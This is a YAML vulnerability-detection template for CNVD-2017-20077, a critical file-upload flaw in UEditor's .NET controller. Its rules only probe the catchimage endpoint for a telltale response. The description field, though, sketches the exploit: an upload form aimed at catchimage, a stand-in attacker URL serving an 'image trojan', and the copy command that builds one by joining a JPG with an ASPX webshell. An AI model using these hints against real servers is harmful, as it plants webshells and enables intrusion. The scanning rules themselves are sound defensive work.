expression: r0() || r1()
id: CNVD-2017-20077
info:
  author: zan8in wuhua
  description: "<form action=\"http://8.8.8.8:8001/ueditor/net/controller.ashx?action=catchimage\"\
    \ enctype=\"multipart/form-data\" method=\"POST\">\nhttp://vps/11.jpg?.aspx 11.jpg\u662F\
    \u56FE\u7247\u9A6C\uFF1B\u5236\u4F5C\u56FE\u7247\u9A6C\uFF1Acopy 1.jpg/b +2.aspx\
    \ 3.aspx\n"
  name: "Ueditor\u7F16\u8F91\u5668.net\u7248\u672C\u5B58\u5728\u6587\u4EF6\u4E0A\u4F20\
    \u6F0F\u6D1E"
  reference:
  - https://www.CNVD.org.cn/flaw/show/CNVD-2017-20077
  - https://zhuanlan.zhihu.com/p/85265552
  - https://www.freebuf.com/vuls/181814.html
  severity: critical
rules:
  r0:
    expression: "response.status == 200 && response.body.bcontains(bytes(string(\"\
      \u6CA1\u6709\u6307\u5B9A\u6293\u53D6\u6E90\")))\n"
    request:
      headers:
        Accept-Encoding: deflate
      method: GET
      path: /ueditor/net/controller.ashx?action=catchimage&encode=utf-8
  r1:
    expression: "response.status == 200 && response.body.bcontains(bytes(string(\"\
      \u6CA1\u6709\u6307\u5B9A\u6293\u53D6\u6E90\")))\n"
    request:
      headers:
        Accept-Encoding: deflate
      method: GET
      path: /js/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
